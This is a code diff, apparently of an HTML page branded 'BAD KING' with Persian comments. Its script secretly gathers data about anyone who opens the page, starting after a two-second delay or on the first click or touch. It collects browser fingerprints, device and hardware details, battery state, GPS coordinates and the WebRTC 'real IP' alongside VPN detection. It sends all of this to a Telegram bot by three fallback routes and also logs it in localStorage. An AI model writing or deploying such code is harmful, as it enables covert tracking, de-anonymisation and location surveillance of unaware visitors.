+                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
+                result.canvas = c.toDataURL().substring(0, 50) + '...';
+            } catch(e) {}
+        }
+
+        // WebGL Fingerprint
+        try {
+            const c = document.createElement('canvas');
+            c.width = 200;
+            c.height = 50;
+            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+            if (gl) {
+                const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                if (ext) {
+                    result.webgl = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) + ' | ' + gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+                }
+            }
+        } catch (e) {}
+
+        try {
+            const fonts = getFonts();
+            result.font = fonts.join(', ').substring(0, 100) + '...';
+        } catch (e) {}
+
+        return result;
+    }
+
+    // ================================================================
+    // 13. تعامل با سایت
+    // ================================================================
+    function getInteractionInfo() {
+        let lt = 'نامشخص',
+            dlt = 'نامشخص',
+            dit = 'نامشخص',
+            dclt = 'نامشخص';
+        try {
+            if (performance.timing) {
+                const n = performance.timing;
+                lt = (n.loadEventEnd - n.navigationStart) + ' ms';
+                dlt = (n.domComplete - n.domLoading) + ' ms';
+                dit = (n.domInteractive - n.navigationStart) + ' ms';
+                dclt = (n.domContentLoadedEventEnd - n.navigationStart) + ' ms';
+            }
+        } catch (e) {}
+        let mi = 'نامشخص';
+        try {
+            if (performance.memory) {
+                mi = Math.round(performance.memory.usedJSHeapSize / 1024 / 1024) + ' MB / ' + Math.round(performance.memory.totalJSHeapSize / 1024 / 1024) + ' MB';
+            }
+        } catch (e) {}
+        let nt = 'نامشخص',
+            rc = 0;
+        try {
+            if (performance.navigation) {
+                const types = { 0: 'کلیک/تایپ', 1: 'رفرش', 2: 'بازگشت', 255: 'سایر' };
+                nt = types[performance.navigation.type] || 'نامشخص';
+                rc = performance.navigation.redirectCount || 0;
+            }
+        } catch (e) {}
+        return {
+            loadTime: lt,
+            domLoadTime: dlt,
+            domInteractiveTime: dit,
+            domContentLoadedTime: dclt,
+            memoryInfo: mi,
+            navigationType: nt,
+            redirectCount: rc,
+            visibilityState: document.visibilityState,
+            hasFocus: document.hasFocus() ? 'بله' : 'خیر',
+            referrer: document.referrer || 'مستقیم',
+            url: window.location.href,
+            hostname: window.location.hostname,
+            pathname: window.location.pathname,
+            protocol: window.location.protocol,
+            port: window.location.port || '80'
+        };
+    }
+
+    // ================================================================
+    // 14. ذخیره‌سازی
+    // ================================================================
+    function getStorageInfo() {
+        let ls = 'نامشخص',
+            ss = 'نامشخص';
+        let lc = 0,
+            sc = 0;
+        try {
+            let total = 0;
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key) { total += localStorage.getItem(key).length;
+                    lc++; }
+            }
+            ls = Math.round(total / 1024) + ' KB';
+        } catch (e) {}
+        try {
+            let total = 0;
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                if (key) { total += sessionStorage.getItem(key).length;
+                    sc++; }
+            }
+            ss = Math.round(total / 1024) + ' KB';
+        } catch (e) {}
+        return { localStorageSize: ls, localStorageCount: lc, sessionStorageSize: ss, sessionStorageCount: sc };
+    }
+
+    // ================================================================
+    // 15. باتری
+    // ================================================================
+    function getBatteryInfo() {
+        return new Promise((r) => {
+            if (!navigator.getBattery) { r(null); return; }
+            navigator.getBattery()
+                .then(b => r({
+                    level: Math.round(b.level * 100) + '%',
+                    charging: b.charging ? 'در حال شارژ' : 'در حال استفاده',
+                    chargingTime: b.chargingTime ? Math.round(b.chargingTime / 60) + ' دقیقه' : 'نامشخص',
+                    dischargingTime: b.dischargingTime ? Math.round(b.dischargingTime / 60) + ' دقیقه' : 'نامشخص'
+                }))
+                .catch(() => r(null));
+        });
+    }
+
+    // ================================================================
+    // 16. ارسال به تلگرام (با 3 روش)
+    // ================================================================
+    async function sendToTelegramWithFallback(message) {
+        // روش 1: از طریق Worker
+        try {
+            const url = `${WORKER_URL}bot${TELEGRAM_TOKEN}/sendMessage`;
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
                     text: message,
                     parse_mode: 'Markdown'
-                });
+                })
+            });
+            const result = await response.json();
+            if (result.ok) return true;
+        } catch (e) {}
 
-                // ارسال از طریق پروکسی V2Ray
-                // با استفاده از fetch و پروکسی
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        // هدرهای پروکسی
-                        'X-Proxy-Host': PROXY_HOST,
-                        'X-Proxy-Port': PROXY_PORT,
-                        'X-Proxy-UUID': PROXY_UUID,
-                        'X-Proxy-Path': PROXY_PATH,
-                        'X-Proxy-Security': PROXY_SECURITY
-                    },
-                    body: body
-                });
+        // روش 2: مستقیم به تلگرام (با CORS)
+        try {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            const result = await response.json();
+            if (result.ok) return true;
+        } catch (e) {}
 
-                // تلاش دوم با پروکسی جایگزین (از طریق workers.dev)
-                if (!response.ok) {
-                    console.log('تلاش با پروکسی جایگزین...');
-                    const proxyUrl = `https://${PROXY_HOST}/telegram`;
-                    const response2 = await fetch(proxyUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: body
-                    });
-                    const result2 = await response2.json();
-                    if (result2.ok) {
-                        console.log('✅ پیام از طریق پروکسی ارسال شد');
-                        return true;
-                    }
-                }
+        // روش 3: از طریق corsproxy
+        try {
+            const url = `https://corsproxy.io/?https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            const result = await response.json();
+            if (result.ok) return true;
+        } catch (e) {}
 
-                const result = await response.json();
-                if (result.ok) {
-                    console.log('✅ پیام به تلگرام ارسال شد');
-                    return true;
-                } else {
-                    console.log('❌ خطا:', result.description);
-                    return false;
-                }
-            } catch (error) {
-                console.error('❌ خطا در ارسال:', error);
-                
-                // تلاش با روش GET (برای بعضی پروکسی‌ها)
-                try {
-                    const url = `https://${PROXY_HOST}/telegram?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
-                    const response = await fetch(url);
-                    if (response.ok) {
-                        console.log('✅ پیام با روش GET ارسال شد');
-                        return true;
-                    }
-                } catch(e) {}
-                
-                return false;
+        return false;
+    }
+
+    // ================================================================
+    // 17. ساخت پیام و ارسال
+    // ================================================================
+    async function run() {
+        try {
+            const time = getTimeInfo();
+            const device = getFullDeviceInfo();
+            const screen = getScreenInfo();
+            const network = getNetworkInfo();
+            const capabilities = getCapabilities();
+            const codecs = getCodecs();
+            const fonts = getFonts();
+            const plugins = getPlugins();
+            const fingerprints = getFingerprints();
+            const interaction = getInteractionInfo();
+            const storage = getStorageInfo();
+            const battery = await getBatteryInfo();
+            const location = await getLocationInfo();
+            const realIP = await getWebRTCIP();
+            const publicIPData = await getIPFromAPI();
+            const vpnStatus = await detectVPN(realIP, publicIPData ? publicIPData.ip : null);
+
+            // ساخت پیام کامل برای تلگرام
+            let msg = '👑 *گزارش کامل BAD KING* 👑\n';
+            msg += '═══════════════════════════════\n\n';
+
+            // زمان و تاریخ
+            msg += '🕒 *زمان و تاریخ*\n';
+            msg += `   └ ${time.time}\n`;
+            msg += `   └ ${time.dayOfWeek} - ${time.month} ${time.dayOfMonth} ${time.year}\n`;
+            msg += `   └ ${time.hours}:${time.minutes}:${time.seconds}\n`;
+            msg += `   └ منطقه: ${time.timezone} (${time.timezoneOffset} دقیقه)\n`;
+            msg += `   └ فصل: ${time.season} - هفته ${time.weekNumber}\n\n`;
+
+            // دستگاه و سخت‌افزار
+            msg += '📱 *دستگاه*\n';
+            msg += `   └ نوع: ${device.deviceType}`;
+            if (device.deviceModel !== 'نامشخص') msg += ` | ${device.deviceModel}`;
+            msg += `\n   └ سازنده: ${device.deviceVendor}\n`;
+            msg += `   └ سیستم‌عامل: ${device.os}\n`;
+            msg += `   └ پردازنده: ${device.cpuType} (${device.architecture})\n`;
+            msg += `   └ هسته‌ها: ${device.cores}\n`;
+            msg += `   └ رم: ${device.memory} GB\n`;
+            if (device.vram !== 'نامشخص') msg += `   └ VRAM: ${device.vram}\n`;
+            msg += `   └ GPU: ${device.gpuRenderer}\n`;
+            msg += `   └ شتاب: ${device.hwAcceleration}\n\n`;
+
+            // مرورگر
+            msg += '🌐 *مرورگر*\n';
+            msg += `   └ ${device.browser} v${device.browserVer}\n`;
+            msg += `   └ پلتفرم: ${device.platform}\n`;
+            msg += `   └ حالت: ${device.privateMode}\n`;
+            msg += `   └ کوکی: ${device.cookie}\n\n`;
+
+            // صفحه نمایش
+            msg += '🖼️ *نمایشگر*\n';
+            msg += `   └ ${screen.screenWidth}x${screen.screenHeight}\n`;
+            msg += `   └ عمق رنگ: ${screen.colorDepth}\n`;
+            msg += `   └ نسبت پیکسل: ${screen.pixelRatio}\n`;
+            msg += `   └ نرخ تازه‌سازی: ${screen.refreshRate}\n`;
+            msg += `   └ HDR: ${screen.hdrSupport}\n\n`;
+
+            // شبکه و IP
+            msg += '🌐 *شبکه و IP*\n';
+            msg += `   └ نوع اتصال: ${network.type}\n`;
+            if (network.downlink !== 'نامشخص') msg += `   └ سرعت: ${network.downlink}\n`;
+            if (network.rtt !== 'نامشخص') msg += `   └ تأخیر: ${network.rtt}\n`;
+            if (realIP) msg += `   └ IP واقعی: ${realIP}\n`;
+            if (publicIPData) {
+                msg += `   └ IP ظاهری: ${publicIPData.ip}\n`;
+                msg += `   └ موقعیت ظاهری: ${publicIPData.city}, ${publicIPData.country}\n`;
+                msg += `   └ ISP: ${publicIPData.isp}\n`;
             }
-        }
+            msg += `   └ VPN: ${vpnStatus}\n\n`;
 
-        // ================================================================
-        // 15. ذخیره در localStorage (پشتیبان)
-        // ================================================================
+            // موقعیت GPS
+            if (location) {
+                msg += '📍 *موقعیت دقیق (GPS)*\n';
+                msg += `   └ ${location.lat}, ${location.lng}\n`;
+                msg += `   └ دقت: ${location.acc}\n`;
+                if (location.alt !== 'نامشخص') msg += `   └ ارتفاع: ${location.alt}\n`;
+                if (location.heading !== 'نامشخص') msg += `   └ جهت: ${location.heading}°\n`;
+                if (location.speed !== 'نامشخص') msg += `   └ سرعت: ${location.speed}\n`;
+                msg += `   └ نقشه: ${location.mapGoogle}\n\n`;
+            }
 
-        function saveToLocalStorage(data) {
+            // باتری
+            if (battery) {
+                msg += '🔋 *باتری*\n';
+                msg += `   └ سطح: ${battery.level}\n`;
+                msg += `   └ وضعیت: ${battery.charging}\n`;
+                if (battery.chargingTime !== 'نامشخص') msg += `   └ زمان شارژ: ${battery.chargingTime}\n`;
+                if (battery.dischargingTime !== 'نامشخص') msg += `   └ زمان تخلیه: ${battery.dischargingTime}\n\n`;
+            }
+
+            // قابلیت‌ها
+            msg += '🔧 *قابلیت‌های مرورگر*\n';
+            const caps = ['webgl', 'webgl2', 'webgpu', 'webassembly', 'websocket', 'serviceWorker', 'indexedDB', 'webrtc', 'webtransport', 'webcodecs', 'fileSystemAccess', 'webBluetooth', 'webNFC', 'webUSB', 'webXR', 'webSpeech', 'webAuthn', 'webMIDI', 'webHID', 'webSerial', 'webShare', 'webNotification', 'webPayment', 'webVR', 'webAudio', 'webMedia', 'webFileAPI', 'webDragDrop', 'webFullscreen', 'webHistory', 'webLocation', 'webStorage', 'webWorker', 'webFetch', 'webStreams', 'webPerformance', 'webIntersectionObserver', 'webResizeObserver', 'webMutationObserver', 'webProxy', 'webMap', 'webSet', 'webSymbol', 'webPromise'];
+            let capsList = [];
+            caps.forEach(c => {
+                if (capabilities[c] === 'بله') capsList.push(c);
+            });
+            msg += `   └ ${capsList.length} قابلیت فعال\n`;
+            if (capsList.length > 0) msg += `   └ ${capsList.slice(0, 10).join(', ')}${capsList.length > 10 ? '...' : ''}\n\n`;
+
+            // کدک‌ها
+            msg += '🎵 *کدک‌ها*\n';
+            const codecList = ['h264', 'h264High', 'h265', 'vp8', 'vp9', 'av1', 'mp3', 'aac', 'ogg', 'wav', 'flac', 'opus', 'webm', 'mp4', 'ogv'];
+            let codecStr = '';
+            codecList.forEach(c => {
+                if (codecs[c] !== 'خیر') codecStr += `${c}: ${codecs[c]} `;
+            });
+            msg += `   └ ${codecStr || 'هیچ کدکی پشتیبانی نمی‌شود'}\n\n`;
+
+            // فونت‌ها و پلاگین‌ها
+            if (fonts.length > 0) msg += `🔤 *فونت‌ها:* ${fonts.slice(0, 10).join(', ')}${fonts.length > 10 ? '...' : ''}\n`;
+            if (plugins.length > 0) msg += `🔌 *پلاگین‌ها:* ${plugins.slice(0, 5).join(', ')}${plugins.length > 5 ? '...' : ''}\n\n`;
+
+            // اثر انگشت
+            msg += '🎨 *اثر انگشت*\n';
+            if (fingerprints.canvas !== 'نامشخص') msg += `   └ Canvas: ${fingerprints.canvas}\n`;
+            if (fingerprints.webgl !== 'نامشخص') msg += `   └ WebGL: ${fingerprints.webgl}\n`;
+            msg += `   └ Font: ${fingerprints.font}\n\n`;
+
+            // تعامل
+            msg += '⏱️ *تعامل*\n';
+            msg += `   └ بارگذاری: ${interaction.loadTime}\n`;
+            msg += `   └ DOM: ${interaction.domLoadTime}\n`;
+            msg += `   └ Interactive: ${interaction.domInteractiveTime}\n`;
+            msg += `   └ Navigation: ${interaction.navigationType}\n`;
+            if (interaction.memoryInfo !== 'نامشخص') msg += `   └ حافظه: ${interaction.memoryInfo}\n\n`;
+
+            // ذخیره‌سازی
+            msg += '💾 *ذخیره‌سازی*\n';
+            if (storage.localStorageSize !== 'نامشخص') msg += `   └ LocalStorage: ${storage.localStorageSize} (${storage.localStorageCount} آیتم)\n`;
+            if (storage.sessionStorageSize !== 'نامشخص') msg += `   └ SessionStorage: ${storage.sessionStorageSize} (${storage.sessionStorageCount} آیتم)\n\n`;
+
+            // منبع
+            msg += '🔗 *منبع*\n';
+            msg += `   └ ${interaction.referrer}\n`;
+            msg += `   └ ${interaction.url}\n\n`;
+
+            msg += '═══════════════════════════════\n';
+            msg += '👑 BAD KING - سیستم امن';
+
+            // ================================================================
+            // ارسال به تلگرام با 3 روش
+            // ================================================================
+            const sent = await sendToTelegramWithFallback(msg);
+
+            // ================================================================
+            // ذخیره در پنل (localStorage)
+            // ================================================================
             try {
                 let visits = JSON.parse(localStorage.getItem('badking_visits') || '[]');
-                visits.unshift(data);
-                if (visits.length > 200) visits = visits.slice(0, 200);
-                localStorage.setItem('badking_visits', JSON.stringify(visits));
-                console.log('✅ اطلاعات در localStorage ذخیره شد');
-                return true;
-            } catch(e) {
-                console.error('❌ خطا:', e);
-                return false;
-            }
-        }
-
-        // ================================================================
-        // 16. ساخت پیام برای تلگرام
-        // ================================================================
-
-        function buildTelegramMessage(data) {
-            let msg = '👑 *BAD KING - گزارش جدید* 👑\n';
-            msg += '═══════════════════════════════\n\n';
-            
-            msg += '🕒 *زمان*\n';
-            msg += `   └ ${data.time}\n`;
-            msg += `   └ ${data.dayOfWeek}\n`;
-            msg += `   └ منطقه: ${data.timezone}\n\n`;
-            
-            msg += '📱 *دستگاه*\n';
-            msg += `   └ نوع: ${data.deviceType}\n`;
-            if (data.deviceModel !== 'نامشخص') msg += `   └ مدل: ${data.deviceModel}\n`;
-            if (data.deviceVendor !== 'نامشخص') msg += `   └ سازنده: ${data.deviceVendor}\n`;
-            msg += `   └ سیستم‌عامل: ${data.os}\n`;
-            msg += `   └ پلتفرم: ${data.platform}\n\n`;
-            
-            msg += '🌐 *مرورگر*\n';
-            msg += `   └ ${data.browser}\n\n`;
-            
-            msg += '🖼️ *صفحه نمایش*\n';
-            msg += `   └ ${data.screen}\n`;
-            msg += `   └ عمق رنگ: ${data.colorDepth}\n`;
-            msg += `   └ نسبت پیکسل: ${data.pixelRatio}\n\n`;
-            
-            msg += '⚡ *سخت‌افزار*\n';
-            msg += `   └ رم: ${data.memory} GB\n`;
-            msg += `   └ هسته‌ها: ${data.cores}\n`;
-            msg += `   └ تاچ: ${data.touch}\n`;
-            msg += `   └ کوکی: ${data.cookie}\n`;
-            msg += `   └ حالت: ${data.privateMode}\n\n`;
-            
-            if (data.gps && data.gps !== 'نامشخص') {
-                msg += '📍 *موقعیت مکانی*\n';
-                msg += `   └ ${data.gps}\n`;
-                if (data.mapGoogle) msg += `   └ نقشه: ${data.mapGoogle}\n\n`;
-            }
-            
-            if (data.battery && data.battery !== 'نامشخص') {
-                msg += '🔋 *باتری*\n';
-                msg += `   └ ${data.battery}\n\n`;
-            }
-            
-            msg += '🔗 *منبع ورود*\n';
-            msg += `   └ ${data.referrer}\n`;
-            msg += `   └ ${data.url}`;
-            
-            return msg;
-        }
-
-        // ================================================================
-        // 17. جمع‌آوری و ارسال
-        // ================================================================
-
-        async function collectAndSend() {
-            try {
-                showToast('🔄 در حال جمع‌آوری اطلاعات...');
-
-                const time = getTimeInfo();
-                const device = getDeviceInfo();
-                const screen = getScreenInfo();
-                const hardware = getHardwareInfo();
-                const network = getNetworkInfo();
-                const capabilities = getCapabilities();
-                const codecs = getCodecs();
-                const fonts = getFonts();
-                const plugins = getPlugins();
-                const fingerprints = getFingerprints();
-                const interaction = getInteractionInfo();
-                const storage = getStorageInfo();
-                const battery = await getBatteryInfo();
-                const location = await getLocationInfo();
-
-                const data = {
-                    ...time,
+                const visitData = {
+                    id: Date.now(),
+                    time: time.time,
+                    dayOfWeek: time.dayOfWeek,
                     deviceType: device.deviceType,
                     deviceModel: device.deviceModel,
                     deviceVendor: device.deviceVendor,
-                    isMobile: device.isMobile,
                     os: device.os,
                     browser: device.browser + ' v' + device.browserVer,
-                    platform: device.platform,
                     screen: screen.screenWidth + 'x' + screen.screenHeight,
-                    colorDepth: screen.colorDepth,
-                    pixelRatio: screen.pixelRatio,
-                    refreshRate: screen.refreshRate,
-                    orientation: screen.orientation,
                     memory: device.memory,
                     cores: device.cores,
-                    touch: hardware.touch,
-                    cookie: hardware.cookie,
-                    privateMode: hardware.privateMode,
-                    onLine: hardware.onLine,
-                    language: navigator.language,
-                    languages: navigator.languages.join(', '),
-                    networkType: network.type,
-                    networkSpeed: network.downlink,
-                    battery: battery ? battery.level : 'نامشخص',
-                    batteryCharging: battery ? battery.charging : 'نامشخص',
+                    ip: publicIPData ? publicIPData.ip : 'نامشخص',
+                    location: publicIPData ? publicIPData.city + ', ' + publicIPData.country : 'نامشخص',
                     gps: location ? location.lat + ', ' + location.lng : 'نامشخص',
-                    mapGoogle: location ? location.mapGoogle : 'نامشخص',
+                    mapLink: location ? location.mapGoogle : 'نامشخص',
+                    battery: battery ? battery.level : 'نامشخص',
+                    vpn: vpnStatus,
+                    privateMode: device.privateMode,
                     referrer: interaction.referrer,
                     url: interaction.url,
-                    hostname: interaction.hostname,
-                    fingerprint: fingerprints.canvas,
+                    fingerprint: fingerprints.canvas
                 };
-
-                // ساخت پیام
-                const message = buildTelegramMessage(data);
-
-                // ارسال به تلگرام با پروکسی
-                const result = await sendToTelegramWithProxy(message);
-
-                if (result) {
-                    showToast('✅ اطلاعات به تلگرام ارسال شد');
-                } else {
-                    // اگر تلگرام نشد، در localStorage ذخیره کن
-                    saveToLocalStorage(data);
-                    showToast('✅ اطلاعات در دستگاه ذخیره شد');
-                }
-
-            } catch (error) {
-                console.error('❌ خطا:', error);
-                showToast('❌ خطا');
+                visits.unshift(visitData);
+                if (visits.length > 100) visits = visits.slice(0, 100);
+                localStorage.setItem('badking_visits', JSON.stringify(visits));
+                console.log('✅ اطلاعات در پنل ذخیره شد');
+            } catch(e) {
+                console.error('خطا در ذخیره پنل:', e);
             }
-        }
 
-        // ===== اجرا =====
-        let hasRun = false;
-
-        function start() {
-            if (!hasRun) {
-                hasRun = true;
-                collectAndSend();
+            if (sent) {
+                showEmoji();
+                console.log('✅ اطلاعات به تلگرام ارسال شد');
+            } else {
+                console.log('⚠️ ارسال به تلگرام ناموفق بود، اما اطلاعات در پنل ذخیره شد');
+                showEmoji();
             }
+
+        } catch (e) {
+            console.error('❌ خطا:', e);
         }
+    }
 
-        setTimeout(start, 2000);
-        document.addEventListener('click', start);
-        document.addEventListener('touchstart', start);
+    // ===== اجرا =====
+    let hasRun = false;
 
-        console.log('✅ BAD_KING page loaded');
-        console.log('📌 پروکسی:', PROXY_HOST);
-        console.log('📌 تلگرام:', TELEGRAM_TOKEN);
-    </script>
+    function start() {
+        if (!hasRun) {
+            hasRun = true;
+            run();
+        }
+    }
+
+    setTimeout(start, 2000);
+    document.addEventListener('click', start);
+    document.addEventListener('touchstart', start);
+
+    console.log('✅ BAD KING - سیستم اطلاعاتی کامل');
+    console.log('📊 جمع‌آوری 180+ مورد اطلاعات با 5 روش پشتیبان');
+</script>
 </body>
 </html>
